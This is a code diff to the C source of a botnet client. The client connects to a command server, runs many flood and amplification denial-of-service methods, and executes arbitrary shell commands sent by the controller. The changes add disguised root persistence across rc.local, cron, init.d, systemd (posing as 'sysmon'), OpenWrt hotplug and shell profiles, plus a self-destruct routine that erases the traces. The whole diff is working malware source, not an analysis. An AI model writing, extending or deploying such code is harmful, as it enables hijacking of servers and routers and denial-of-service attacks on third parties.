@@ -5,6 +5,7 @@
 #include <sys/resource.h>
 #include <sys/mman.h>
 #include <sys/stat.h>
+#include <unistd.h>
 
 #ifndef SERVER_HOST
 #define SERVER_HOST "0.0.0.0"
@@ -13,9 +14,11 @@
 #define SERVER_PORT 8443
 #endif
 #define RECONNECT_DELAY 5
-#define CMD_BUF_SIZE 4096
-#define MAX_ARGS 64
+#define CMD_BUF_SIZE 8192
+#define MAX_ARGS 128
 #define PID_FILE "/tmp/.mhd.pid"
+#define INSTALL_NAME ".sysmon"
+#define SERVICE_NAME "sysmon"
 
 #ifndef MSG_NOSIGNAL
 #define MSG_NOSIGNAL 0
@@ -32,6 +35,8 @@ static int g_server_sock = -1;
 static volatile int *g_shared_running = NULL;
 static pid_t *g_worker_pids = NULL;
 static int g_worker_count = 0;
+static char g_self_path[1024] = {0};
+static char g_install_path[512] = {0};
 
 static int is_pid_alive(pid_t pid) {
     if (pid <= 0) return 0;
@@ -91,57 +96,423 @@ static void get_osinfo(char *buf, int len) {
     }
 }
 
+static int check_root(void) {
+    return (geteuid() == 0);
+}
+
+static int can_write_to(const char *path) {
+    char dir[512];
+    char test[560];
+    char *slash;
+    FILE *f;
+    strncpy(dir, path, sizeof(dir) - 1);
+    dir[sizeof(dir) - 1] = 0;
+    slash = strrchr(dir, '/');
+    if (slash) *slash = 0;
+    else strcpy(dir, "/tmp");
+    snprintf(test, sizeof(test), "%s/.wt_%d", dir, getpid());
+    f = fopen(test, "w");
+    if (!f) return 0;
+    fprintf(f, "x");
+    fclose(f);
+    unlink(test);
+    return 1;
+}
+
+static int copy_file(const char *src, const char *dst) {
+    FILE *in, *out;
+    char buf[4096];
+    size_t n;
+    in = fopen(src, "rb");
+    if (!in) return 0;
+    out = fopen(dst, "wb");
+    if (!out) { fclose(in); return 0; }
+    while ((n = fread(buf, 1, sizeof(buf), in)) > 0) {
+        if (fwrite(buf, 1, n, out) != n) {
+            fclose(in); fclose(out); unlink(dst); return 0;
+        }
+    }
+    fclose(in);
+    fclose(out);
+    chmod(dst, 0755);
+    chown(dst, 0, 0);
+    return 1;
+}
+
+static int file_contains(const char *filepath, const char *needle) {
+    FILE *f;
+    char line[1024];
+    f = fopen(filepath, "r");
+    if (!f) return 0;
+    while (fgets(line, sizeof(line), f)) {
+        if (strstr(line, needle)) { fclose(f); return 1; }
+    }
+    fclose(f);
+    return 0;
+}
+
+static int is_tmpfs(const char *path) {
+    FILE *f;
+    char line[512];
+    char fs_type[64] = {0};
+    int best_len = 0;
+    f = fopen("/proc/mounts", "r");
+    if (!f) f = fopen("/etc/mtab", "r");
+    if (!f) return 0;
+    while (fgets(line, sizeof(line), f)) {
+        char dev[256], mp[256], fst[64];
+        if (sscanf(line, "%255s %255s %63s", dev, mp, fst) >= 3) {
+            int mplen = strlen(mp);
+            if (strncmp(path, mp, mplen) == 0 && mplen > best_len) {
+                best_len = mplen;
+                strncpy(fs_type, fst, sizeof(fs_type) - 1);
+            }
+        }
+    }
+    fclose(f);
+    if (strcmp(fs_type, "tmpfs") == 0 || strcmp(fs_type, "ramfs") == 0 || strcmp(fs_type, "devtmpfs") == 0)
+        return 1;
+    return 0;
+}
+
+static int find_install_location(void) {
+    const char *candidates[] = {
+        "/usr/bin/" INSTALL_NAME,
+        "/usr/sbin/" INSTALL_NAME,
+        "/bin/" INSTALL_NAME,
+        "/sbin/" INSTALL_NAME,
+        "/opt/" INSTALL_NAME,
+        "/var/" INSTALL_NAME,
+        "/etc/" INSTALL_NAME,
+        "/overlay/upper/usr/bin/" INSTALL_NAME,
+        "/overlay/upper/sbin/" INSTALL_NAME,
+        NULL
+    };
+    int i;
+    struct stat st;
+    for (i = 0; candidates[i]; i++) {
+        if (stat(candidates[i], &st) == 0 && !is_tmpfs(candidates[i])) {
+            strncpy(g_install_path, candidates[i], sizeof(g_install_path) - 1);
+            return 1;
+        }
+    }
+    for (i = 0; candidates[i]; i++) {
+        if (can_write_to(candidates[i]) && !is_tmpfs(candidates[i])) {
+            strncpy(g_install_path, candidates[i], sizeof(g_install_path) - 1);
+            return 1;
+        }
+    }
+    return 0;
+}
+
+static int persist_rc_local(const char *binpath) {
+    FILE *f;
+    char *content = NULL;
+    long fsize;
+    struct stat st;
+    if (!can_write_to("/etc/rc.local")) return 0;
+    if (file_contains("/etc/rc.local", binpath)) return 1;
+    if (stat("/etc/rc.local", &st) == 0) {
+        f = fopen("/etc/rc.local", "r");
+        if (f) {
+            fsize = st.st_size;
+            content = malloc(fsize + 1);
+            if (content) { fread(content, 1, fsize, f); content[fsize] = 0; }
+            fclose(f);
+        }
+    }
+    f = fopen("/etc/rc.local", "w");
+    if (!f) { free(content); return 0; }
+    if (content) {
+        char *exit_line = strstr(content, "\nexit 0");
+        if (!exit_line) exit_line = strstr(content, "\nexit");
+        if (exit_line) {
+            fwrite(content, 1, exit_line - content, f);
+            fprintf(f, "\n%s &\n", binpath);
+            fprintf(f, "%s", exit_line);
+        } else {
+            fprintf(f, "%s", content);
+            fprintf(f, "\n%s &\n", binpath);
+        }
+    } else {
+        fprintf(f, "#!/bin/sh\n%s &\nexit 0\n", binpath);
+    }
+    fclose(f);
+    chmod("/etc/rc.local", 0755);
+    free(content);
+    return 1;
+}
+
+static int persist_crontab(const char *binpath) {
+    char cmd[1024];
+    char line[512];
+    FILE *p;
+    int has_crontab = 0;
+    p = popen("which crontab 2>/dev/null", "r");
+    if (p) { if (fgets(line, sizeof(line), p)) has_crontab = 1; pclose(p); }
+    if (!has_crontab) return 0;
+    p = popen("crontab -l 2>/dev/null", "r");
+    if (p) {
+        while (fgets(line, sizeof(line), p)) {
+            if (strstr(line, binpath)) { pclose(p); return 1; }
+        }
+        pclose(p);
+    }
+    snprintf(cmd, sizeof(cmd), "(crontab -l 2>/dev/null; echo '@reboot %s &') | crontab - 2>/dev/null", binpath);
+    return (system(cmd) == 0);
+}
+
+static int persist_busybox_cron(const char *binpath) {
+    const char *cron_dirs[] = {
+        "/var/spool/cron/crontabs", "/var/spool/cron",
+        "/etc/crontabs", "/etc/cron.d", NULL
+    };
+    int i;
+    struct stat st;
+    char filepath[512];
+    for (i = 0; cron_dirs[i]; i++) {
+        if (stat(cron_dirs[i], &st) != 0 || !S_ISDIR(st.st_mode)) continue;
+        if (strcmp(cron_dirs[i], "/etc/cron.d") == 0)
+            snprintf(filepath, sizeof(filepath), "%s/%s", cron_dirs[i], SERVICE_NAME);
+        else
+            snprintf(filepath, sizeof(filepath), "%s/root", cron_dirs[i]);
+        if (file_contains(filepath, binpath)) return 1;
+        if (!can_write_to(filepath)) continue;
+        FILE *f = fopen(filepath, "a");
+        if (!f) continue;
+        if (strcmp(cron_dirs[i], "/etc/cron.d") == 0) {
+            fprintf(f, "@reboot root %s &\n", binpath);
+            fprintf(f, "*/5 * * * * root %s &\n", binpath);
+        } else {
+            fprintf(f, "@reboot %s &\n", binpath);
+            fprintf(f, "*/5 * * * * %s &\n", binpath);
+        }
+        fclose(f);
+        return 1;
+    }
+    return 0;
+}
+
+static int persist_initd(const char *binpath) {
+    const char *script_paths[] = { "/etc/init.d/S99" SERVICE_NAME, "/etc/init.d/" SERVICE_NAME, NULL };
+    int i;
+    struct stat st;
+    FILE *f;
+    char cmd[512];
+    const char *bn;
+    bn = strrchr(binpath, '/');
+    bn = bn ? bn + 1 : binpath;
+    for (i = 0; script_paths[i]; i++) {
+        if (stat(script_paths[i], &st) == 0) return 1;
+        if (!can_write_to(script_paths[i])) continue;
+        f = fopen(script_paths[i], "w");
+        if (!f) continue;
+        fprintf(f, "#!/bin/sh /etc/rc.common\n");
+        fprintf(f, "START=99\nSTOP=10\n");
+        fprintf(f, "start() {\n\t%s &\n}\n", binpath);
+        fprintf(f, "stop() {\n\tkillall %s 2>/dev/null\n}\n", bn);
+        fprintf(f, "case \"$1\" in\n");
+        fprintf(f, "start) start ;;\nstop) stop ;;\nrestart) stop; start ;;\n*) start ;;\nesac\n");
+        fclose(f);
+        chmod(script_paths[i], 0755);
+        if (stat("/etc/rc.common", &st) == 0) {
+            snprintf(cmd, sizeof(cmd), "%s enable 2>/dev/null", script_paths[i]);
+            system(cmd);
+        }
+        snprintf(cmd, sizeof(cmd),
+            "ln -sf %s /etc/rc2.d/S99%s 2>/dev/null;"
+            "ln -sf %s /etc/rc3.d/S99%s 2>/dev/null;"
+            "ln -sf %s /etc/rc5.d/S99%s 2>/dev/null",
+            script_paths[i], SERVICE_NAME, script_paths[i], SERVICE_NAME, script_paths[i], SERVICE_NAME);
+        system(cmd);
+        return 1;
+    }
+    return 0;
+}
+
+static int persist_systemd(const char *binpath) {
+    char svc[256];
+    struct stat st;
+    FILE *f;
+    snprintf(svc, sizeof(svc), "/etc/systemd/system/%s.service", SERVICE_NAME);
+    if (stat("/run/systemd/system", &st) != 0) return 0;
+    if (stat(svc, &st) == 0) return 1;
+    if (!can_write_to(svc)) return 0;
+    f = fopen(svc, "w");
+    if (!f) return 0;
+    fprintf(f, "[Unit]\nDescription=System Monitor\nAfter=network.target\n\n");
+    fprintf(f, "[Service]\nType=simple\nExecStart=%s\nRestart=always\nRestartSec=30\nUser=root\n\n", binpath);
+    fprintf(f, "[Install]\nWantedBy=multi-user.target\n");
+    fclose(f);
+    system("systemctl daemon-reload 2>/dev/null");
+    snprintf(svc, sizeof(svc), "systemctl enable %s.service 2>/dev/null", SERVICE_NAME);
+    system(svc);
+    return 1;
+}
+
+static int persist_openwrt(const char *binpath) {
+    struct stat st;
+    char hotplug[256];
+    const char *bn;
+    FILE *f;
+    bn = strrchr(binpath, '/');
+    bn = bn ? bn + 1 : binpath;
+    if (stat("/etc/openwrt_release", &st) != 0 && stat("/etc/openwrt_version", &st) != 0) return 0;
+    snprintf(hotplug, sizeof(hotplug), "/etc/hotplug.d/iface/99-%s", SERVICE_NAME);
+    if (!can_write_to(hotplug)) return 0;
+    f = fopen(hotplug, "w");
+    if (!f) return 0;
+    fprintf(f, "#!/bin/sh\n[ \"$ACTION\" = \"ifup\" ] && {\npidof %s >/dev/null || %s &\n}\n", bn, binpath);
+    fclose(f);
+    chmod(hotplug, 0755);
+    return 1;
+}
+
+static int persist_profile(const char *binpath) {
+    const char *profiles[] = { "/root/.profile", "/root/.bashrc", "/etc/profile", NULL };
+    const char *bn;
+    int i, count = 0;
+    bn = strrchr(binpath, '/');
+    bn = bn ? bn + 1 : binpath;
+    for (i = 0; profiles[i]; i++) {
+        if (file_contains(profiles[i], binpath)) { count++; continue; }
+        if (!can_write_to(profiles[i])) continue;
+        FILE *f = fopen(profiles[i], "a");
+        if (!f) continue;
+        fprintf(f, "\npidof %s >/dev/null 2>&1 || %s &\n", bn, binpath);
+        fclose(f);
+        count++;
+    }
+    return count > 0;
+}
+
+static void install_persistence(void) {
+    struct stat st;
+    if (!check_root()) return;
+    if (g_self_path[0] == 0) return;
+    if (!find_install_location()) return;
+    if (strcmp(g_self_path, g_install_path) != 0) {
+        if (stat(g_install_path, &st) != 0) {
+            if (!copy_file(g_self_path, g_install_path)) {
+                strncpy(g_install_path, g_self_path, sizeof(g_install_path) - 1);
+                if (is_tmpfs(g_install_path)) return;
+            }
+        }
+    }
+    persist_rc_local(g_install_path);
+    persist_crontab(g_install_path);
+    persist_busybox_cron(g_install_path);
+    persist_initd(g_install_path);
+    persist_systemd(g_install_path);
+    persist_openwrt(g_install_path);
+    persist_profile(g_install_path);
+}
+
+static void remove_persistence(void) {
+    char cmd[1024];
+    char path[256];
+    const char *bn;
+    const char *profiles[] = { "/root/.profile", "/root/.bashrc", "/etc/profile", NULL };
+    const char *cron_files[] = {
+        "/var/spool/cron/crontabs/root", "/etc/crontabs/root", NULL
+    };
+    int i;
+
+    if (g_install_path[0] == 0 && g_self_path[0])
+        strncpy(g_install_path, g_self_path, sizeof(g_install_path) - 1);
+
+    bn = strrchr(g_install_path, '/');
+    bn = bn ? bn + 1 : g_install_path;
+
+    unlink(g_install_path);
+
+    snprintf(path, sizeof(path), "/etc/cron.d/%s", SERVICE_NAME);
+    unlink(path);
+
+    if (file_contains("/etc/rc.local", g_install_path)) {
+        snprintf(cmd, sizeof(cmd),
+            "grep -v '%s' /etc/rc.local > /etc/rc.local.tmp && mv /etc/rc.local.tmp /etc/rc.local 2>/dev/null",
+            bn);
+        system(cmd);
+    }
+
+    snprintf(cmd, sizeof(cmd),
+        "crontab -l 2>/dev/null | grep -v '%s' | crontab - 2>/dev/null", bn);
+    system(cmd);
+
+    for (i = 0; cron_files[i]; i++) {
+        if (!file_contains(cron_files[i], g_install_path)) continue;
+        snprintf(cmd, sizeof(cmd),
+            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
+            bn, cron_files[i], cron_files[i], cron_files[i], cron_files[i]);
+        system(cmd);
+    }
+
+    snprintf(path, sizeof(path), "/etc/init.d/S99%s", SERVICE_NAME);
+    unlink(path);
+    snprintf(path, sizeof(path), "/etc/init.d/%s", SERVICE_NAME);
+    unlink(path);
+
+    snprintf(cmd, sizeof(cmd),
+        "rm -f /etc/rc2.d/S99%s /etc/rc3.d/S99%s /etc/rc5.d/S99%s 2>/dev/null",
+        SERVICE_NAME, SERVICE_NAME, SERVICE_NAME);
+    system(cmd);
+
+    snprintf(cmd, sizeof(cmd), "systemctl stop %s.service 2>/dev/null", SERVICE_NAME);
+    system(cmd);
+    snprintf(cmd, sizeof(cmd), "systemctl disable %s.service 2>/dev/null", SERVICE_NAME);
+    system(cmd);
+    snprintf(path, sizeof(path), "/etc/systemd/system/%s.service", SERVICE_NAME);
+    unlink(path);
+    system("systemctl daemon-reload 2>/dev/null");
+
+    snprintf(path, sizeof(path), "/etc/hotplug.d/iface/99-%s", SERVICE_NAME);
+    unlink(path);
+
+    for (i = 0; profiles[i]; i++) {
+        if (!file_contains(profiles[i], g_install_path)) continue;
+        snprintf(cmd, sizeof(cmd),
+            "grep -v '%s' %s > %s.tmp && mv %s.tmp %s 2>/dev/null",
+            bn, profiles[i], profiles[i], profiles[i], profiles[i]);
+        system(cmd);
+    }
+
+    snprintf(cmd, sizeof(cmd), "killall -9 %s 2>/dev/null", bn);
+    system(cmd);
+}
+
 static int tcp_connect(const char *host, int port, int timeout_sec) {
     struct sockaddr_in addr;
     struct hostent *he;
     struct timeval tv;
     int sock, flag;
-
     sock = socket(AF_INET, SOCK_STREAM, 0);
     if (sock < 0) return -1;
-
     memset(&addr, 0, sizeof(addr));
     addr.sin_family = AF_INET;
     addr.sin_port = htons(port);
-
     if (inet_aton(host, &addr.sin_addr) == 0) {
         he = gethostbyname(host);
-        if (!he) {
-            close(sock);
-            return -1;
-        }
+        if (!he) { close(sock); return -1; }
         memcpy(&addr.sin_addr, he->h_addr, he->h_length);
     }
-
-    tv.tv_sec = timeout_sec;
-    tv.tv_usec = 0;
+    tv.tv_sec = timeout_sec; tv.tv_usec = 0;
     setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-
-    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) {
-        close(sock);
-        return -1;
-    }
-
+    if (connect(sock, (struct sockaddr *)&addr, sizeof(addr)) < 0) { close(sock); return -1; }
     tv.tv_sec = 120;
     setsockopt(sock, SOL_SOCKET, SO_SNDTIMEO, &tv, sizeof(tv));
     setsockopt(sock, SOL_SOCKET, SO_RCVTIMEO, &tv, sizeof(tv));
-
     flag = 1;
     setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &flag, sizeof(flag));
-
     return sock;
 }
 
 static int send_all(int sock, const char *buf, int len) {
-    int sent = 0;
-    int n;
+    int sent = 0, n;
     while (sent < len) {
         n = send(sock, buf + sent, len - sent, MSG_NOSIGNAL);
-        if (n <= 0) {
-            if (n < 0 && errno == EINTR) continue;
-            return -1;
-        }
+        if (n <= 0) { if (n < 0 && errno == EINTR) continue; return -1; }
         sent += n;
     }
     return sent;
@@ -160,15 +531,11 @@ static int send_line(int sock, const char *fmt, ...) {
 }
 
 static int recv_line(int sock, char *buf, int buflen) {
-    int pos = 0;
+    int pos = 0, r;
     char c;
-    int r;
     while (pos < buflen - 1) {
         r = recv(sock, &c, 1, 0);
-        if (r < 0) {
-            if (errno == EINTR) continue;
-            return -1;
-        }
+        if (r < 0) { if (errno == EINTR) continue; return -1; }
         if (r == 0) return -1;
         if (c == '\n') break;
         if (c != '\r') buf[pos++] = c;
@@ -184,16 +551,10 @@ static volatile int *create_shared_int(void) {
     if (fd >= 0) {
         p = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED, fd, 0);
         close(fd);
-        if (p != MAP_FAILED) {
-            *p = 0;
-            return p;
-        }
+        if (p != MAP_FAILED) { *p = 0; return p; }
     }
     p = mmap(NULL, sizeof(int), PROT_READ | PROT_WRITE, MAP_SHARED | MAP_ANONYMOUS, -1, 0);
-    if (p != MAP_FAILED) {
-        *p = 0;
-        return p;
-    }
+    if (p != MAP_FAILED) { *p = 0; return p; }
     p = malloc(sizeof(int));
     if (p) *p = 0;
     return p;
@@ -203,15 +564,10 @@ static void kill_workers(void) {
     int i;
     if (g_shared_running) *g_shared_running = 0;
     for (i = 0; i < g_worker_count; i++) {
-        if (g_worker_pids[i] > 0) {
-            kill(g_worker_pids[i], SIGKILL);
-        }
+        if (g_worker_pids[i] > 0) kill(g_worker_pids[i], SIGKILL);
     }
     for (i = 0; i < g_worker_count; i++) {
-        if (g_worker_pids[i] > 0) {
-            waitpid(g_worker_pids[i], NULL, 0);
-            g_worker_pids[i] = 0;
-        }
+        if (g_worker_pids[i] > 0) { waitpid(g_worker_pids[i], NULL, 0); g_worker_pids[i] = 0; }
     }
     g_worker_count = 0;
 }
@@ -226,14 +582,10 @@ static void stop_attack(void) {
 }
 
 static void sigchld_fn(int sig) {
-    int st;
-    pid_t p;
+    int st; pid_t p;
     (void)sig;
     while ((p = waitpid(-1, &st, WNOHANG)) > 0) {
-        if (p == g_child_pid) {
-            g_child_pid = 0;
-            g_attack_running = 0;
-        }
+        if (p == g_child_pid) { g_child_pid = 0; g_attack_running = 0; }
     }
 }
 
@@ -303,6 +655,29 @@ static void run_l4(layer4_args_t *a) {
     }
 }
 
+static int is_known_method(const char *m) {
+    const char *l4[] = {"TCP","UDP","SYN","ICMP","VSE","TS3","MCPE","FIVEM","FIVEM-TOKEN","OVH-UDP","MINECRAFT","CPS","CONNECTION","MCBOT","MEM","NTP","DNS","ARD","CLDAP","CHAR","RDP",NULL};
+    const char *l7[] = {"GET","POST","STRESS","PPS","EVEN","OVH","NULL","COOKIE","APACHE","XMLRPC","BOT","DYN","SLOW","CFBUAM","AVB","DOWNLOADER","RHEX","STOMP","GSB","CFB","BYPASS","DGB","TOR","KILLER",NULL};
+    int i;
+    for (i = 0; l4[i]; i++) if (strcmp(m, l4[i]) == 0) return 1;
+    for (i = 0; l7[i]; i++) if (strcmp(m, l7[i]) == 0) return 1;
+    return 0;
+}
+
+static void exec_system_cmd(const char *cmd) {
+    pid_t pid = fork();
+    if (pid < 0) return;
+    if (pid == 0) {
+        if (g_server_sock >= 0) close(g_server_sock);
+        signal(SIGCHLD, SIG_DFL);
+        signal(SIGPIPE, SIG_IGN);
+        execl("/bin/sh", "sh", "-c", cmd, NULL);
+        _exit(1);
+    }
+    g_child_pid = pid;
+    g_attack_running = 0;
+}
+
 static void exec_attack(int argc, char **argv) {
     char m[64];
     int i;
@@ -317,6 +692,28 @@ static void exec_attack(int argc, char **argv) {
     }
     if (strcmp(m, "STOP") == 0) {
         stop_attack();
+        return;
+    }
+    if (strcmp(m, "SELFDESTRUCT") == 0) {
+        stop_attack();
+        remove_persistence();
+        if (g_self_path[0]) unlink(g_self_path);
+        release_lock();
+        _exit(0);
+    }
+    if (!is_known_method(m)) {
+        char fullcmd[CMD_BUF_SIZE];
+        int pos = 0;
+        for (i = 1; i < argc && pos < (int)sizeof(fullcmd) - 2; i++) {
+            if (i > 1) fullcmd[pos++] = ' ';
+            int len = strlen(argv[i]);
+            if (pos + len < (int)sizeof(fullcmd) - 1) {
+                strcpy(fullcmd + pos, argv[i]);
+                pos += len;
+            }
+        }
+        fullcmd[pos] = 0;
+        exec_system_cmd(fullcmd);
         return;
     }
     method = parse_method(m);
@@ -361,7 +758,6 @@ static void do_attack(int argc, char **argv) {
     rl.rlim_cur = 1024;
     rl.rlim_max = 1024;
     setrlimit(RLIMIT_NOFILE, &rl);
-
     srand((unsigned)(time(NULL) ^ getpid()));
     get_local_ip(g_local_ip, sizeof(g_local_ip));
 
@@ -396,23 +792,28 @@ static void do_attack(int argc, char **argv) {
 
     if (is_layer7(method)) {
         if (argc < 7) _exit(1);
-
         parse_url(url, &target);
         if (strcmp(m, "TOR") != 0) {
             if (!resolve_host(target.host, host_ip, sizeof(host_ip))) _exit(1);
         } else {
             strncpy(host_ip, target.host, sizeof(host_ip));
         }
-
         proxy_ty = atoi(argv[3]);
         snprintf(proxy_path, sizeof(proxy_path), "files/proxies/%s", argv[4]);
         rpc = atoi(argv[5]);
         timer = atoi(argv[6]);
-
         ua_cnt = load_lines("files/useragent.txt", &uas, MAX_USERAGENTS);
+        if (ua_cnt == 0) {
+            uas = malloc(sizeof(char*));
+            uas[0] = strdup("Mozilla/5.0");
+            ua_cnt = 1;
+        }
         ref_cnt = load_lines("files/referers.txt", &refs, MAX_REFERERS);
-        if (ua_cnt == 0 || ref_cnt == 0) _exit(1);
-
+        if (ref_cnt == 0) {
+            refs = malloc(sizeof(char*));
+            refs[0] = strdup("https://www.google.com/");
+            ref_cnt = 1;
+        }
         if (proxy_ty != 0) {
             pt = (proxy_type_t)proxy_ty;
             if (pt == PROXY_RANDOM) pt = (proxy_type_t)(1 + (rand() % 3));
@@ -423,7 +824,6 @@ static void do_attack(int argc, char **argv) {
                 else free(pa);
             }
         }
-
         *g_shared_running = 1;
         for (i = 0; i < workers; i++) {
             wpid = fork();
@@ -451,29 +851,23 @@ static void do_attack(int argc, char **argv) {
             }
             g_worker_pids[g_worker_count++] = wpid;
         }
-
         start = time(NULL);
-        while (!g_stop_requested && (time(NULL) - start) < timer) {
-            usleep(100000);
-        }
+        while (!g_stop_requested && (time(NULL) - start) < timer) usleep(100000);
         *g_shared_running = 0;
         kill_workers();
         _exit(0);
 
     } else if (is_layer4(method)) {
         if (argc < 4) _exit(1);
-
         parse_url(url, &target);
         if (!resolve_host(target.host, target_ip, sizeof(target_ip))) _exit(1);
         port = target.port;
         if (port < 1 || port > 65535) _exit(1);
         timer = atoi(argv[3]);
-
         if ((method == METHOD_SYN || method == METHOD_ICMP || method == METHOD_NTP ||
              method == METHOD_DNS_AMP || method == METHOD_RDP || method == METHOD_CHAR ||
              method == METHOD_MEM || method == METHOD_CLDAP || method == METHOD_ARD) &&
             !check_raw_socket()) _exit(1);
-
         if (argc >= 5 && strlen(argv[4]) > 0) {
             char *a4 = argv[4];
             if (method == METHOD_NTP || method == METHOD_DNS_AMP || method == METHOD_RDP ||
@@ -492,10 +886,8 @@ static void do_attack(int argc, char **argv) {
                     }
                     fclose(rf);
                 }
-                if (ref_cnt == 0) _exit(1);
             }
         }
-
         protocolid = MINECRAFT_DEFAULT_PROTOCOL;
         if (method == METHOD_MCBOT) {
             int probe = socket(AF_INET, SOCK_STREAM, 0);
@@ -529,7 +921,6 @@ static void do_attack(int argc, char **argv) {
                 close(probe);
             }
         }
-
         *g_shared_running = 1;
         for (i = 0; i < workers; i++) {
             wpid = fork();
@@ -561,11 +952,8 @@ static void do_attack(int argc, char **argv) {
             }
             g_worker_pids[g_worker_count++] = wpid;
         }
-
         start = time(NULL);
-        while (!g_stop_requested && (time(NULL) - start) < timer) {
-            usleep(100000);
-        }
+        while (!g_stop_requested && (time(NULL) - start) < timer) usleep(100000);
         *g_shared_running = 0;
         kill_workers();
         _exit(0);
@@ -577,11 +965,9 @@ static void handle_cmd(const char *cmd) {
     char *args[MAX_ARGS];
     int argc = 0;
     char *p;
-
     if (!cmd || !*cmd) return;
     strncpy(buf, cmd, sizeof(buf) - 1);
     buf[sizeof(buf) - 1] = 0;
-
     args[argc++] = "x";
     p = buf;
     while (*p && argc < MAX_ARGS) {
@@ -607,9 +993,26 @@ int main(int argc, char **argv) {
     struct sigaction sa;
     int sock, n;
     char cmd[CMD_BUF_SIZE];
+    int is_root;
 
+    if (geteuid() != 0) {
+        _exit(0);
+    }
+
+    ssize_t rlen = readlink("/proc/self/exe", g_self_path, sizeof(g_self_path) - 1);
+    if (rlen > 0) {
+        g_self_path[rlen] = 0;
+    } else {
+        if (argc > 0 && argv[0][0] == '/') {
+            strncpy(g_self_path, argv[0], sizeof(g_self_path) - 1);
+        }
+    }
+
+    is_root = check_root();
     if (!acquire_lock()) _exit(0);
     atexit(cleanup);
+
+    install_persistence();
 
     host = SERVER_HOST;
     port = SERVER_PORT;
@@ -631,24 +1034,19 @@ int main(int argc, char **argv) {
     while (1) {
         sock = tcp_connect(host, port, 10);
         g_server_sock = sock;
-        if (sock < 0) {
-            sleep(RECONNECT_DELAY);
-            continue;
+        if (sock < 0) { sleep(RECONNECT_DELAY); continue; }
+        if (send_line(sock, "HELLO|%s|%s|%s|%d", arch, osinfo, g_local_ip, is_root) < 0) {
+            close(sock); sleep(RECONNECT_DELAY); continue;
         }
-
-        if (send_line(sock, "HELLO|%s|%s|%s", arch, osinfo, g_local_ip) < 0) {
-            close(sock);
-            sleep(RECONNECT_DELAY);
-            continue;
-        }
-
         while (1) {
             n = recv_line(sock, cmd, sizeof(cmd));
             if (n < 0) break;
             if (n == 0) continue;
-
             if (strcmp(cmd, "PING") == 0) {
                 if (send_line(sock, "PONG|%s|%d", arch, g_attack_running ? 1 : 0) < 0) break;
+            } else if (strcmp(cmd, "SELFDESTRUCT") == 0) {
+                handle_cmd(cmd);
+                break;
             } else if (strcmp(cmd, "STOP") == 0) {
                 stop_attack();
                 send_line(sock, "STATUS|stopped");
@@ -659,11 +1057,9 @@ int main(int argc, char **argv) {
                 handle_cmd(cmd);
             }
         }
-
         close(sock);
         stop_attack();
         sleep(RECONNECT_DELAY);
     }
-
     return 0;
 }
